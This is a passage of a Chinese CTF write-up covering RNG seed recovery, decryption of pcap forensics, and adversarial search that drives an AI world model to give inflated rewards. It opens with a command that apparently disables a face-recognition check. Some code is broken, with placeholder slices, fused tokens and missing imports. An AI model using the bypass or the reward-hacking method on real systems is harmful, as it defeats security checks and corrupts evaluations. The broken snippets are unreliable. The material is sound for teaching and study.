PY

```

```bash
mkdir -p /run/0perator
printf 'disabled' > /run/0perator/face.status

dbus-send --system --print-reply \
  --dest=org.operator.DeviceManager \
  /org/operator/DeviceManager \
  org.operator.DeviceManager1.ReloadComponents
```

* * *

## Misc3-NeuronShuffle

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | Misc |
| 形态  | 附件题（离线分析，无远程服务） |
| 附件  | neuron_shuffle_8a803e935e33df360a9e1e1976d567c5.zip，55598字节 |
| 目标  | 无（离线附件） |

Flag：flag{5c2aabdc937513bde1ba502f14cc51b6}

题面：本题含有少量人工神经元，运输过程中可能出现沉淀，使用前请充分摇匀；如出现头晕、眼花、脱发或开始质疑自我，均属正常现象。请勿停止做题，以免前功尽弃。本品最终解释权归脑子所有。 题面里“充分摇匀”和“沉淀”是直接提示：权重是一份被随机打乱了顺序的神经网络参数，解题的关键不是反推神经网络本身，而是还原打乱顺序所用的随机数。

### 2\. 题目分析

#### 附件结构

解压后的目录只有三个文件，没有源码工程也没有权重配置文件：

```
neuron_shuffle/
├── check.py      校验器，963字节
├── model_A.npz   可正常加载的权重，44982字节
└── model_B.bin   等长二进制，44982字节
```

`model_A.npz` 用 `np.load(..., allow_pickle=False)` 可以正常读出，包含8个数组：

| 数组  | 形状  | 作用  |
| --- | --- | --- |
| `k0` | `(16,)` | 第2层偏置，16维 |
| `k1` | `(16,32)` | 第1层权重，32维输入→16维输出 |
| `k2` | `(40,48)` | 第2层权重，48维输入→40维输出 |
| `k3` | `(48,)` | 第1层偏置，48维 |
| `k4` | `(40,)` | 第3层偏置，40维 |
| `k5` | `(48,32)` | 第1层权重，32维输入→48维输出 |
| `k6` | `(32,40)` | 第3层权重，40维输入→32维输出 |
| `k7` | `(32,)` | 输出层偏置，32维 |

把偏置维度和权重形状对齐，可以还原出网络拓扑为 `32→48→40→32→16` （权重按(输出维, 输入维)存放，也就是PyTorch的 `Linear.weight` 风格）： `k5` 是32→48， `k3` 是48维偏置， `k2` 是48→40， `k4` 是40维偏置， `k6` 是40→32， `k7` 是32维偏置， `k1` 是32→16， `k0` 是16维偏置。

目标主机实际读出的形状与 `dtype` ：

```go
k3 (48,)     float64      k4 (40,)     float64
k6 (32, 40)  float64      k7 (32,)     float64
k1 (16, 32)  float64      k5 (48, 32)  float64
k2 (40, 48)  float64      k0 (16,)     float64
```

三个较宽隐层的宽度正好是 `48` 、 `40` 、 `32` ，这三个数后面会原样成为置换（打乱）的参数。

`model_B.bin` 是干扰项：长度44982字节，与 `model_A.npz` 完全等长；前16字节为 `3268100616af6522bb081f48d0acf626` ，形如一个16字节摘要；整个文件的字节分布接近均匀（每个字节值出现频率约200次），既不满足 `zipfile.is_zipfile` ，也不是zlib/lzma/bz2压缩流，按 `float64` 、 `float32` 在任何偏移切片都得不到量级合理的权重值。它是权重被“摇匀/加密”后的黑盒副本，无法直接解析。

解题不需要拆开 `model_B.bin` ： `model_A.npz` 已经给出了同一批张量的数值，缺的只是“顺序”。题目真正的考点在 `check.py` ——它要的答案是一段索引排列。

#### check.py的校验逻辑

`check.py` 全文只有三十余行，核心是把用户输入规范化后做两级SHA-256：

```python
V = "cf8303ef7e9fc6f51baf27b6e2c8763bd199a0a24c5294bcdaca3ddef6e47864"

def main():
    if len(sys.argv) != 2:
        sys.exit(__doc__)
    src = Path(sys.argv[1])
    try:
        text = src.read_text() if src.exists() else sys.argv[1]
    except OSError:          # inline answer string too long for a filename
        text = sys.argv[1]
    try:
        canon = ";".join(",".join(str(int(v)) for v in s.split(","))
                         for s in text.strip().split(";"))
    except Exception:
        sys.exit("[-] wrong")
    body = hashlib.sha256(canon.encode()).hexdigest()[:<端口>]
    if hashlib.sha256(("ns::" + body).encode()).hexdigest() == V:
        print(f"[+] correct! flag = flag{{{body}}}")
    else:
        sys.exit("[-] wrong")
```

几点关键设计：

1.  **输入形式宽松**：参数既可以是文件路径，也可以直接是答案字符串（Windows上超长字符串当路径会触发 `OSError` ，用 `except OSError` 兜底回退成字符串）。
    
2.  **规范化很严**：按`;`切三段、每段按`,`切、每项 `int()` 后重新拼接，因此前导零、空格、多余换行都会被吃掉；答案在文本层面唯一，必须真正生成正确的索引序列，随便加空格不会“碰巧”通过。
    
3.  **两级哈希**：先算body = sha256(canon)\[:<端口>\]（只取前32个十六进制字符，即128位），再算 `sha256("ns::" + body)` 与硬编码常量 `V` 比对。
    
4.  **flag就是 `body` **： `body` 直接构成 `flag{...}` 的内容，所以二级哈希只是“防直接读flag”的外壳，真正要做的是** 还原被哈希的原文**，而不是爆破摘要。
    

`V` 在附件里是明文常量，这给出了一个可判定的终点：只要构造出一段候选规范串，算两次哈希就能立刻判断对错，不需要提交到平台。

#### 权重来自可预测的随机序列

对 `model_A.npz` 做统计：8个数组共 `5384` 个 `float64` ，去重后只剩 `926` 个不同的值。如果权重是逐层独立抽样得到的连续分布随机数，上千个值几乎不可能出现如此高的重复率，说明权重是 **从一个候选值池按索引反复取用** 的。

再用默认位生成器验证： `np.random.default_rng(20261101).normal(0, 0.6, 974)` 产生的974个样本恰好覆盖模型全部926个唯一值，而且 `k5` 的第0行（32个值）与样本序列的前32个 **逐位相同**：

```
k5[0][:5]  = [-1.07367412 -1.10126123  0.5885369   0.40113786  0.03993815]
samples[:5] = [-1.07367412 -1.10126123  0.5885369   0.40113786  0.03993815]
array_equal(k5[0], samples[:<端口>]) → True
```

这里的相等是 `float64` 的完全相等，不是近似相等。池长974是下界而非估计值：模型里最后被用到的那个值位于该序列下标973，取973个样本无法覆盖全部权重，取974个刚好覆盖。

由此得到三条可复用的结论：

1.  权重由 `default_rng` 的 `normal(0, 0.6, N)` 生成，均值和标准差固定为 `0` 与 `0.6` ；
    
2.  种子是整数，且 `20261101` 符合 `YYYYMMDD` 日期形式，说明种子就是日期；
    
3.  序列是确定性的，只要种子对了，整个模型可以原位重建；反之种子空间极小，可以直接枚举。
    

### 3\. 解题过程

#### 提取浮点池与指纹行

先把模型压成一个一维浮点池（用于判断覆盖率），同时单独保存 `k5` 第0行（用于锁定序列起点）：

```sql
with np.load('model_A.npz', allow_pickle=False) as model:
    row = model['k5'][0].copy()
    values = np.unique(np.concatenate([model[name].ravel() for name in model.files]))
```

选择 `k5[0]` 作为“指纹行”有两个原因：它是模型里真实存在的一行，长度32足以排除偶然命中；它的值恰好等于序列的前32个样本并且保持顺序，等于把种子的起点也一起钉死了。如果只用“集合覆盖”判断，序列越长越容易误命中，命中后还要再回头验证顺序，多绕一步。

本步结果： `row` 长度32， `values` 长度926。

#### 枚举日期种子并逐位比对

种子既然是日期，枚举窗口取题目发布前后的三个月即可：从 `2026-10-01` 开始连续92天（覆盖到 `2026-12-31` ）。对每个日期做两步比对：

```sql
day = start + timedelta(days=offset)
seed = int(day.strftime('%Y%m%d'))
samples = np.random.default_rng(seed).normal(0, 0.6, 974)
if np.array_equal(row, samples[:<端口>]) and np.setdiff1d(values, samples).size == 0:
    ...
```

-   np.array_equal(row, samples\[:<端口>\])： `float64` 逐位相等，没有容差，避免“看起来差不多”的误判；
    
-   `np.setdiff1d(values, samples).size == 0` ：模型全部926个唯一值都必须出现在974个样本里，排除“前32个碰巧相同但整体不对”的假阳性。
    

枚举结果是 **唯一命中**：

```
weight seed = 20261101   （2026-11-01）
```

其余91个日期要么前32个样本不匹配，要么无法覆盖926个唯一值，直接被淘汰。

#### 用相邻种子生成48/40/32置换

权重池由 `20261101` 生成，那么“摇匀”这一步用的就是同一条随机流的后续调用。 `default_rng` 是流式的，同一种子连续取用即可复现；出题人的做法是把权重生成和打乱放在相邻两天的种子上，因此只需在 `20261101` 的基础上试 `-1` 、 `0` 、 `+1` 三天，代价可以忽略。

置换参数来自2.1里读出的三个隐层宽度： `48` 、 `40` 、 `32` 。对每个宽度调用 `rng.permutation(n)` ，得到长度为 `n` 的索引数组（ `0..n-1` 的一个排列， `permutation` 返回新数组，正好适合这种“只要排列”的场景）。三段合并成规范串：段内用`,`连接，段间用`;`连接，与 `check.py` 的 `canon` 规则完全一致。

实际生成结果（ `20261102` ）为329字符，共120个索引：

```
39,40,46,0,2,24,45,15,30,21,10,11,27,43,16,38,33,5,23,26,22,32,13,42,19,36,25,1,31,34,18,9,20,7,44,3,4,14,28,12,35,41,37,17,8,47,6,29;20,25,36,35,15,0,5,19,38,17,27,10,24,7,23,22,28,12,11,4,3,14,34,26,21,37,30,16,9,8,39,31,2,29,33,32,1,6,13,18;2,16,12,17,29,5,22,13,4,3,8,24,7,26,21,23,25,31,28,15,30,10,6,19,18,9,1,14,11,20,0,27
```

三段的长度分别为 `48` 、 `40` 、 `32` ，每段都是 `0..n-1` 的完整排列（可以自己用 `len` 和 `sorted` 核对），说明这不是随手拼的随机数字，而是三个货真价实的置换。

三段之间不能调换顺序： `check.py` 按出现的顺序把三段分别当成长度48、40、32的层，一旦顺序换了，规范化字符串就变了，哈希必然不同。

#### SHA-256校验与flag推导

按 `check.py` 的规则做两级哈希：

```
body   = sha256("39,40,46,...,0,27")[:<端口>]
       = 5c2aabdc937513bde1ba502f14cc51b6
second = sha256("ns::" + body)
       = cf8303ef7e9fc6f51baf27b6e2c8763bd199a0a24c5294bcdaca3ddef6e47864
```

第二级结果与 `check.py` 里硬编码的 `V` 完全一致，校验通过。把329字符的规范串写进文本文件后直接用附件校验器复核，输出：

```
[+] correct! flag = flag{...}
```

`body` 本身就是flag主体，因此：

```
flag{...}
```

整条链路的逻辑闭环是：模型权重的浮点值由 `20261101` 的正态序列决定 → 打乱顺序的置换由 `20261102` 的同一条随机流决定 → 置换拼成规范串 → 规范串的SHA-256前32位就是flag。 `model_B.bin` 始终没有被解析，它只是把“顺序被打乱”这件事具象化的黑盒拷贝。

### 4\. PoC

```python
import numpy as np

V = "cf8303ef7e9fc6f51baf27b6e2c8763bd199a0a24c5294bcdaca3ddef6e47864"
START = date(2026, 10, 1)
DAYS = 92
POOL = 974
LAYERS = (48, 40, 32)

def load_pool_hint(path="model_A.npz"):
    with np.load(path, allow_pickle=False) as model:
        row = model["k5"][0].copy()
        values = np.unique(np.concatenate([model[n].ravel() for n in model.files]))
    return row, values

def find_seed(row, values):
    for offset in range(DAYS):
        day = START + timedelta(days=offset)
        seed = int(day.strftime("%Y%m%d"))
        samples = np.random.default_rng(seed).normal(0, 0.6, POOL)
        if np.array_equal(row, samples[:<端口>]) and np.setdiff1d(values, samples).size == 0:
            return day
    raise SystemExit("seed not found")

def main():
    row, values = load_pool_hint()
    print(f"[*] unique floats = {values.size}, fingerprint len = {row.size}")

    day = find_seed(row, values)
    print(f"[*] weight seed = {day:%Y%m%d}")

    for shift in (-1, 0, 1):
        perm_day = day + timedelta(days=shift)
        rng = np.random.default_rng(int(perm_day.strftime("%Y%m%d")))
        answer = ";".join(",".join(map(str, rng.permutation(n))) for n in LAYERS)
        body = hashlib.sha256(answer.encode()).hexdigest()[:<端口>]
        if hashlib.sha256(("ns::" + body).encode()).hexdigest() == V:
            print(f"[*] perm  seed = {perm_day:%Y%m%d}")
            print(f"[*] answer({len(answer)}) = {answer}")
            print(f"[+] flag = flag{{{body}}}")
            return
    raise SystemExit("permutation seed not found")

if __name__ == "__main__":
    main()

```

* * *

## Misc4-谍影重重7

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | Misc |
| 形态  | 容器题 |
| 附件  | manager.pcap、internal.pcap、browser.keys |
| 目标  | <靶机地址> |

Flag：flag{动态容器已脱敏}

题面：公司收到举报，员工张纪星涉嫌未经授权访问内部核心计算机并窃取机密数据；已提取涉案设备的网络流量，需要分析通信、重建访问链路、追踪文件传输过程，查明实际获取的数据内容。题面注明人物与事件均为虚构。

### 2\. 题目分析

管理侧浏览器通过PVE打开Windows虚拟机OFFICE01，操作员在该虚拟机内以 `CORE01\Tsuki` 登录<靶机地址>，利用RDP磁盘重定向把Restic仓库复制回目标主机，最后在本地用口令解锁仓库，取出并解密 `core-assets.db` 。

取证对象因此分成三层：PVE管理侧的控制台画面、内网RDP连接中传输的Restic仓库、以及员工机上的加密资产库。六问分别对应这三层的中间结论，最终落到 `core-assets.db` 的大小与哈希。

证据之间的关系是链式的：

1.  `browser.keys` 是浏览器会话密钥，用来解开 `manager.pcap` 里的TLS，从而拿到VNC WebSocket流量，还原管理控制台画面，得到虚拟机节点与分辨率，以及操作员访问的RDP目标。
    
2.  `internal.pcap` 中的RDPDR通道承载了磁盘重定向传输的Restic仓库文件；仓库本身是加密的，口令来自控制台画面上的莫尔斯码操作。
    
3.  仓库内最新快照含 `MouseVault.exe` 与 `core-assets.vault` ；数字键盘每次交互后换位，需要把RFB鼠标事件与画面帧对齐才能得到键盘输入序列，该序列即保险库口令。
    
4.  用口令走PBKDF2-HMAC-SHA256派生密钥，AES-CBC解密并校验HMAC，得到SQLite数据库，再核验完整性、大小与哈希。
    

### 3\. 解题过程

#### 解密管理侧流量并还原控制台

`manager.pcap` 是浏览器与PVE之间的HTTPS流量，密钥日志 `browser.keys` 为NSS key log格式。把日志交给TShark后即可解密，第68条TCP流是一次WebSocket会话，升级请求路径为：

```
/api2/json/nodes/pve-lab/qemu/219/vncwebsocket
```

由此确定节点 `pve-lab` 与虚拟机ID `219` ，这也是第1问的提交值 `pve-lab|219` 。随后按TCP方向重组WebSocket负载：客户端到服务端的帧是鼠标、键盘事件，服务端到客户端的帧是RFB协议数据。

服务端先完成RFB 3.8握手（版本协商、安全类型、ServerInit），ServerInit中的宽高为 `1024` × `768` ，据此确定第2问的前两段。之后是Tight编码的FramebufferUpdate：每个矩形带紧凑长度前缀，按压缩控制字节选择Fill、JPEG或基本压缩，并用zlib流解压。

首个包含像素的完整更新从抓包第1939帧开始，共143个像素矩形。重组时保留普通矩形里的指针像素，不另行叠加独立光标；得到完整的一帧RGB888原始字节后，对该原始像素求MD5，而不是对PNG文件求哈希，结果为 `ce1f5a34c7370f7f20038d9683f1d9b3bdc6dfc51e7db1b5f8798565dac27334` ，与 `1024|768` 拼成第2问的答案。

画面中还包含两处关键信息：远程桌面连接窗口里的地址与账户，以及记事本里的莫尔斯码操作，后者在3.3节使用。

#### 定位RDP连接与账户

`internal.pcap` 是内网流量，RDP连接的服务器地址为<靶机地址>。X.224连接请求中的 `mstshash=Tsuki` 给出登录名，TLS握手中服务器证书的CN为 `CORE01` ，两者拼出域账户 `CORE01\Tsuki` 。

完成第3问后可下载 `rdp.keys` 。将其交给TShark即可解密RDP的TLS层，之后在MCS通道 `1004` 上重组RDPDR消息：先解析 `PAKID_CORE_DEVICE_IOREQUEST` 与 `PAKID_CORE_DEVICE_IOCOMPLETION` ，用完成ID把创建请求与其返回的文件句柄关联起来，再按句柄和 `Offset` / `Length` 把写请求的负载按偏移写回文件。

重组结果是一个完整的Restic仓库目录，包含 `config` 、 `data/` 、 `index/` 、 `keys/` 、 `snapshots/` 。每个数据包、索引与快照文件的SHA-256都与文件名相符，说明重组无误。

#### 从控制台操作还原仓库口令

口令线索出现在远程登录之前：操作员在记事本里用鼠标敲莫尔斯码。规则是画面语义而不是按键本身——在记事本正文空白处单击是点，按住标题栏拖动是划，单击外部桌面表示一个分组结束，标题栏上仅为激活窗口的单击不计符号。

按帧时间把RFB鼠标事件与当时画面对齐后，得到分组序列：

```
-. / - / ....- / ...- / .--. / ..... / -..- / ---.. / ....- / ..--- / -.. / -..
```

逐组查表得到 `NT4VP5X842DD` 。该口令通过Restic的 `check` 校验，可以解开仓库密钥文件。仓库内两份快照时间分别为00:<端口>:<端口>与00:<端口>:<端口>（UTC+8），解密 `snapshots/` 下的JSON后按时间取后者，其ID为 `d7d68e7ed46b6f1082ceaa797b7493e4cad96e00bc45a264bc8cf8a80960b48d` ，与口令拼成第4问的答案。

#### 还原键盘口令并解密保险库

最新快照里有两个文件： `MouseVault.exe` 与 `core-assets.vault` 。员工电脑的屏幕数字键盘每次交互后都会换位，所以不能直接读按键坐标，必须把RFB鼠标事件与当时的画面帧对齐，读出点击位置对应的数字；同时剔除被取消的拖动，处理退格，并保留开头的两个零。最终得到 `006187393179` ，即第5问答案，也是保险库口令。

从 `MouseVault.exe` 的.NET IL可以读出文件格式：头部为magic、盐、IV与HMAC；密钥用PBKDF2-HMAC-SHA256、200,000次迭代从口令派生64字节，前32字节用于AES-256-CBC，后32字节用于HMAC-SHA256校验。验签、解密、去PKCS#7填充后，取出内层文件名与内容，写出 `core-assets.db` 。

数据库通过 `PRAGMA integrity_check` 返回 `ok` ，其中含256条资产、256条部署、512条配置修订，以及1条导出清单记录。文件大小为 `2424832` 字节，SHA-256为 `5dec31e12a4d02f09d82e254cd752f5ba64bb254472e1111234af2c0e8441419` ，拼成第6问答案。

六问结论汇总：

| 问   | 提交值 |
| --- | --- |
| 1   | \`pve-lab\\ |
| 2   | \`1024\\ |
| 3   | \`<靶机地址>\\ |
| 4   | \`NT4VP5X842DD\\ |
| 5   | `006187393179` |
| 6   | \`core-assets.db\\ |

### 4\. PoC

```python
import subprocess, sys
from pathlib import Path

def export(cap, keys, display, fields, out):
    cmd = ['tshark', '-nr', cap, '-o', 'tls.keylog_file:' + keys,
           '-Y', display, '-T', 'fields']
    for field in fields:
        cmd += ['-e', field]
    with open(out, 'wb') as fp:
        subprocess.run(cmd, stdout=fp, check=True)

export('manager.pcap', 'browser.keys',
       'tcp.stream==68 && websocket.payload',
       ['frame.number', 'frame.time_relative', 'tcp.srcport', 'websocket.payload'],
       'websocket.tsv')

export('internal.pcap', 'rdp.keys',
       't124.channelId==1004 && t124.userData',
       ['frame.number', 'ip.src', 't124.channelId', 't124.userData'],
       'channels.tsv')

```

```python
import hashlib, zlib
from pathlib import Path

W, H = 1024, 768
fb = bytearray(W * H * 3)

stream = bytearray()
for line in Path('websocket.tsv').read_text().splitlines():
    parts = line.split('\t')
    if len(parts) < 4ornot parts[3]:
        continue
    if int(parts[0]) < 1939or int(parts[2]) != 5900:
        continue                      # 首帧之前、以及客户端方向都不取
    stream += bytes.fromhex(parts[3].replace(':', ''))

def put_rect(x, y, w, h, raw):
    for yy in range(h):
        base = ((y + yy) * W + x) * 3
        fb[base:base + w * 3] = raw[yy * w * 3:(yy + 1) * w * 3]

pos = 0
rects = 0
while pos + 4 <= len(stream):
    typ = stream[pos]
```

* * *

## Misc5-Dreambound

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | Misc |
| 形态  | 混合题 |
| 附件  | model.py、checkpoint.pt（4,245,557 B）、requirements.txt |
| 目标  | 容器  |

Flag：flag{动态容器已脱敏}

题面： **Dreambound**— "Try to dream hallucinate."

### 2\. 题目分析

#### 思路概要

附件直接给了一个 **完整的世界模型和权重**：服务端接收48步离散动作（每步5选1），用模型"想象"（ `imagine` ）未来48步的奖励并求和作为分数，分数过阈值就给flag。所以这题不是盲打，而是 **离线把模型当白盒，搜一条让reward head输出爆炸的动作序列**，再在线提交。

最终这条序列把GRU隐状态推到分布外，单步reward最大冲到 **564**，48步合计1290。

#### 附件分析

```
dreambound/
├── checkpoint.pt    4,245,557 B   torch.save({"config": {}, "state_dict": ...})
├── model.py         1,715 B       模型定义 + imagine() + load_checkpoint()
└── requirements.txt               torch>=2.0, numpy>=1.24
```

`model.py` 核心：

```haskell
OBS_DIM, ACT_DIM, H_DIM = 4, 5, 384

class WorldModel(nn.Module):
    def __init__(self, obs_dim=4, act_dim=5, h_dim=384):
        self.gru           = nn.GRUCell(act_dim, h_dim)          # 5 -> 384
        self.decoder       = Sequential(Linear(384,256), ReLU(), Linear(256,4))
        self.reward_head   = Sequential(Linear(384,512), ReLU(),
                                        Linear(512,512), ReLU(), Linear(512,1))
        self.continue_head = Sequential(Linear(384,128), ReLU(), Linear(128,1))

    def step(self, h, a_onehot):return self.gru(a_onehot, h)
    def predict_reward(self, h):return self.reward_head(h).squeeze(-1)
    def decode(self, h):          return self.decoder(h)

@torch.no_grad()
def imagine(model, actions):          # actions: (B, T) 的 long
    h = model.initial(actions.shape[0], actions.device)
    rewards = []
    for t in range(actions.shape[1]):
        a = F.one_hot(actions[:, t], model.act_dim).float()
        h = model.step(h, a)
        rewards.append(model.predict_reward(h))
    return torch.stack(rewards, dim=1)   # (B, T)
```

`checkpoint.pt` 用 `torch.load(..., weights_only=False)` 直接可读，只有 `config` （空字典）和 `state_dict` 两个键。加载后统计：

| 项   | 值   |
| --- | --- |
| 总参数量 | **1,059,718** |
| GRU `weight_ih` | `[1152, 5]`<br><br>（3×384门） |
| GRU `weight_hh` | `[1152, 384]` |
| 隐状态维度 | 384 |
| 动作维度 | 5（0–4） |
| 序列长度 | 48（服务端错误信息给出） |

解码头 `decode` 和 `continue_head` 在这题里没被服务用到，真正参与打分的只有 **GRU + reward_head**。

#### 模型的想象结果

`WorldModel` 是一个隐空间世界模型：它不预测画面，而是把历史压进384维隐状态 `h` ，再用三个头分别解码观测、奖励和终止信号。 `gru` 是 `GRUCell(5, 384)` ，每步只吃一个5维one-hot动作：

```cpp
r_t = σ(W_r a_t + U_r h_{t-1} + b_r)
z_t = σ(W_z a_t + U_z h_{t-1} + b_z)
n_t = tanh(W_n a_t + U_n (r_t ⊙ h_{t-1}) + b_n)
h_t = (1 - z_t) ⊙ n_t + z_t ⊙ h_{t-1}
```

三个门各384维，所以 `weight_ih` 是 `[1152, 5]` 、 `weight_hh` 是 `[1152, 384]` 。输入只有5维，携带的信息极少， `h_t` 主要由 `h_{t-1}` 和固定偏置决定，动作序列的作用更像"沿着一条轨迹持续轻推"；真正把 `h` 推远的不是某一步的神来之笔，而是几十步同向累积。

`reward_head` 是 `384→512→512→1` 的MLP，中间ReLU、末端线性。ReLU让它在 `h` 上分段线性，末端无激活意味着 **输出没有上界**：只要 `h` 落进某个"高奖励扇形"，单步reward可以任意大。 `decoder` （ `384→256→4` ）和 `continue_head` （ `384→128→1` ）分别是观测重建与终止预测，属于训练世界模型时的辅助头，打分时完全不参与。

`imagine()` 就是"在隐空间里做梦"：从零状态出发喂48个动作，逐步取reward，全程不回真实环境。所以分数衡量的不是"这条策略真能拿多少分"，而是"模型相信它能拿多少分"——题面"Try to dream hallucinate"说的正是这件事。

#### 动作空间与搜索规模

服务端要求恰好48个 `[0,5)` 整数，组合数 `5^48 ≈ 2.8×10^33` ，穷举无望；但单条评估极便宜：48次384维 `GRUCell` 加48次小MLP，CPU上批量算上百条也在毫秒级。这种"维度中等、评估廉价、目标确定"的结构适合基于邻域的启发式搜索。每步只有5种取值，邻域也规整：固定其余47步、枚举某一步的另外4种，一次全扫描正好 `48×4=192` 条，可以一个batch前向算完，这直接决定了后面的坐标下降方案。

#### 白盒给

附件把模型定义和 `state_dict` 一起给出，等于把评分函数原样交出：可以本地复现分数、看任意时刻的 `h` 、对输入求梯度、无限次批量评估而不受服务端限速。黑盒只能一次次提交换回一个标量，既慢又看不到中间量。所以本题难点不在"猜打分逻辑"，而在"对一个已知函数做组合优化"。

同时这也暴露了设计缺陷：服务端直接对48个reward求和， **不clip单步奖励、不约束隐状态范数、也不检查动作是否落在训练分布内**，模型在分布外给出的荒谬高奖励会被照单全收。

#### 阈值的大致位置

常量策略已经给了参照：全0是7.15、全1是-63.12、全3是24.80、全4是170.51。全4是常量里最好的却仍不返flag，说明阈值明显高于170；按此类题的常见设置，大概率是1000这样的整数。必须找到比最好的常量策略还高数倍的序列，"稍微调一调"到不了，只能真正把隐状态推到模型没见过的区域。

#### 从防御视角看

这题本质是 **奖励模型被对抗性策略利用**：

-   世界模型/奖励模型在训练分布内很准，但对分布外的隐状态会输出荒谬的高奖励；
    
-   如果这是真实的RL训练/评估系统，攻击者可以构造动作序列骗过reward model，得到虚高的评估分（reward hacking）；
    
-   缓解思路：奖励模型集成/不确定性估计、隐状态范数约束、动作序列分布约束（KL/支持集限制）、对抗训练、以及把"想象评估"和"真实环境评估"交叉验证。
    

### 3\. 解题过程

#### 服务侦察：它不是HTTP

##### 第一反应：nc / socket

```
$ nc * *
（无 banner，等 60 秒也没有任何输出）
```

用Python连上后发送 `\n` 、 `0\n` 、 `hello\n` 再半关闭，全部 **没有任何响应**；连接会被静默关闭。

##### 误以为HTTP

用 `curl` 发GET：

```
curl -v <靶机地址>
```

结果非常怪：

```swift
* Received HTTP/0.9 when not allowed
< {"ok": false, "error": "bad submission: want {\"actions\": [48 ints in [0,5)]}"}
```

-   服务 **没有回状态行/响应头** （HTTP/0.9风格），只吐了一个JSON body；
    
-   但这个body把期望的格式写得明明白白： `{"actions": [48 ints in [0,5)]}` 。
    

于是按它说的发：

```
curl -s -X POST <靶机地址> \
     -H 'Content-Type: application/json' \
     -d '{"actions":[0,0,...,0]}'
```

依旧 `bad submission` 。换成 `compact` 写法、 `text/plain` 、少一个元素、全4、GET query…… **全部都是同一条错误**。

##### 真正的协议：裸TCP上的一行JSON

把JSON **不带头** 直接写到socket上：

```
s = socket.create_connection(("*", *))
s.sendall(b'{"actions":[0,0,...,0]}\n')
print(s.recv(4096))
```

```json
{"ok": true, "score": 7.1452}
```

成了。

##### 协议实验汇总

| 发送方式 | 结果  |
| --- | --- |
| HTTP `POST /` + body `test` | `bad submission` |
| HTTP `POST /` +合法JSON body（带请求头） | `bad submission` |
| JSON放在请求行里 `POST {json} HTTP/1.0` | `bad submission` |
|     | `bad submission` |
| `GET /?actions=[...]` | `bad submission` |
| 裸socket发JSON， **不带换行** 后半关闭 | 空响应（服务端按行读，没读到完整行） |
| 裸socket发JSON + `\n` | `{"ok": true, "score": ...}`<br><br>✅ |
| 裸socket发JSON + `\r\n\r\n` | 同上 ✅ |

结论：服务端是 **按行读取** 的极简实现，拿到一整行后 `json.loads` ；带HTTP请求头时第一行是 `POST / HTTP/1.1` ，解析必然失败，于是统一回 `bad submission` 。

#### 逆向打分函数

##### 先猜：sum(imagine(...))

`imagine()` 返回 `(B, T)` 的reward。服务只回一个 `score` ，最自然的是 `sum` 。

用 **全1** 序列做指纹最干净（数值小、特征明显），代码见第4.1节。

服务端：

```json
{"ok": true, "score": -63.1219}
```

**完全对上了** （四位小数）。打分函数确认：

```
score(a) = Σ_{t=1..48} reward_head( GRU(one_hot(a_t), h_{t-1}) )
```

##### 常量动作基线

| 序列  | 本地 `sum` | 服务端 `score` |
| --- | --- | --- |
| 全0  | 7.146025 | 7.1452 |
| 全1  | **\-63.121872** | **\-63.1219** |
| 全2  | \-208.885254 | —   |
| 全3  | 24.797272 | —   |
| 全4  | 170.508408 | 170.5086 |

（本地与服务端有~1e-3的尾差，来自torch版本/浮点累加差异，不影响判断。）

全4已经能到170.5，但服务 **不返flag**——说明阈值明显更高。

##### 排除均值、最大值与折扣

只对上了一个数还不够，要排除"服务端算的是均值或最大值"。均值假设可以直接否掉：全4的均值只有3.55，服务端却返回170.5086；最大值假设也不成立，全1与全4的稳态单步reward不会差出233。所以只能是求和。若还想确认有没有折扣因子，可做前缀截断：把同一序列截到前24步、前12步分别提交，若返回值和本地对应前缀的累加一致，就说明没有 `γ` ——有折扣时截断后的比值会随长度漂移。

#### 问题形式化

```
maximize  f(a) = Σ_{t=0}^{47} reward_head(h_t)
s.t.      a_t ∈ {0,1,2,3,4},  h_t = GRU(one_hot(a_t), h_{t-1}),  h_{-1} = 0
```

-   搜索空间 `5^48 ≈ 2.8×10^33` ，暴力不可能；
    
-   但模型完全已知、推理极快（48步GRU，384维）；
    
-   目标是 **单目标最大化**，可以用"批量评估+局部搜索"。
    

先看解的形态： `reward_head` 最后一层是线性的，GRU隐状态被 `tanh` 限幅在 `[-1,1]` ，但384维全饱和时，线性层输出仍然可以很大。 **只要把隐状态推到某个极端区域，单步reward就能爆**。这正是题目名"dream hallucinate" —— 让世界模型"梦见"不真实的高奖励。

把48步的单步reward单独拆开看，地形比总分更说明问题：常量策略很快进入稳态，全4大约每步3.55，全2则是负的-4.35；而最优序列前12步只在-6.37到31.86之间小幅波动，第36、37步却突然冒出526和564，同时全程有17步是负的。高总分并不是"每步都好"，而是 **先铺垫、后引爆**——前面几十步负责把 `h` 送进奖励头的极端扇区，一旦进入，单步输出就脱离正常量级。这种"少数步贡献绝大部分分数"的形态意味着目标高度多峰、峰很窄，也就排除了任何依赖平滑性的优化器。

#### 方法一：梯度法（行不通）

既然模型可导，直觉是先做连续松弛：把 `48×5` 的logits当参数，用Gumbel-softmax采样软动作，前向换成one-hot、反向把梯度灌回soft值，即straight-through估计。温度 `τ` 从2.0线性退火到0.3，前期软、后期硬，指望logits逐渐逼近one-hot分布。实现见第4.2节。

纸面上这条路很顺： `GRUCell` 和两层MLP都可导，48步展开就是一张现成计算图， `total` 对 `logits` 的梯度能一路反传。但实际跑600步、多个随机种子，最好的离散结果只有：

```
best = 28.26
```

比全4（170.5）还差。

**原因**：

1.  GRU是逐时间步递推的，soft输入（5维概率向量）和one-hot输入产生的轨迹差异很大，梯度指向的"软最优"在argmax后不成立；
    
2.  reward对输入非常敏感（3.7节的单点扰动数据改一个动作分数能从1290掉到200），软松弛把这种尖锐性抹平了；
    
3.  目标不是平滑函数，局部梯度几乎无意义。
    

还有一层更本质的问题：即使梯度方向是对的，离散动作也没有"步长"可调。logits动一点，argmax可能纹丝不动，也可能整步翻转，梯度给的是局部斜率而不是可执行的离散更新；再加上48步递推中每步雅可比连乘，长程依赖上的梯度要么消失要么被放大，指向的方向在argmax之后往往并不成立。白盒梯度能告诉你"往哪边软一点会更好"，却回答不了"把哪一步改成哪个整数"。

结论： **这题适合离散搜索，不适合梯度**。

#### 方法二：批量离散搜索（成功）

##### 批量评估

一次前向评估B条序列，充分利用CPU向量化，批量打分函数见第4.3节。

单条评估约0.1 ms量级，一次评估192条邻域毫无压力。

##### 坐标下降

固定其余47个动作，枚举第t个动作的5种取值，取最优，实现见第4.3节。

一次完整扫描评估 `48×4 = 192` 条，几轮就收敛到局部最优。

##### 随机扰动跳出局部最优

